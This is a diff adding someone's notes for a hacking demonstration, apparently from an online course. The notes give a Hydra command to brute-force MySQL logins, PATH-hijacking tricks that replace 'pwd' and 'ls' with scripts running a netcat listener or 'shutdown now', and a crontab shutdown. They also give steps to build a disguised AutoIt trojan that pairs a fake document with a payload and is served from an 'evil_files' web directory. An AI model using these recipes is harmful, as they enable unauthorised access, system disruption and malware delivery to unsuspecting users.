@@ -1,0 +1,52 @@
+Demonstration scheduled for 30/8/18
+
+I) Hydra
+	Requirements : 
+		1) usernames.txt // list of valid usernames
+		2) passwords.txt // worldist
+		3) Ensure that the users mentioned in usernames.txt have all 
+		   privileges 
+		"GRANT ALL PRIVELEGES ON *.* to 'username'@'ip_of_mysql_server' WITH ALL GRANT OPTION;
+	Command : 
+		hydra -L usernames.txt -P passwords.txt <ip_of_mysql_server> mysql
+
+II) Shell tricks
+
+	All these scripts were placed in /home/user/Scripts
+	and PATH updated in /etc/environment to /home/user/Scripts:/<remainingPATH>
+ [Don't work]
+	1) pwd 
+		nc -l -p 3000 // original pwd works 
+			      // only path to Scripts is specified
+	2) ls
+		shutdown now // doesn't let system boot don't know why
+			     // (Extremely dangerous !)
+	3) cd 
+		cd $1
+		echo blah blah 
+
+ [Work]
+	1) ls
+		echo 
+		nc
+
+
+
+ [Crontab]
+	1) shutdown     //works
+	2) exit (from terminal) //doesn't work cuz exit is a built-in command.
+				  It doesn't have any script for it .
+
+
+
+
+
+
+Malicious File
+1) Download the fake document(jpg,pdf,whatever) and the autoit script from udemy
+2) In the autoit script , in the Local URL section , first give url of the fake document and then the location of the 
+   payload in your computer . Save it as .au3 extension .
+3) Open compile in Kali , give location of the au3 , an icon and click convert .
+4) Rename if reqd .
+5) Copy and paste it in /var/www/html/evil_files 
+
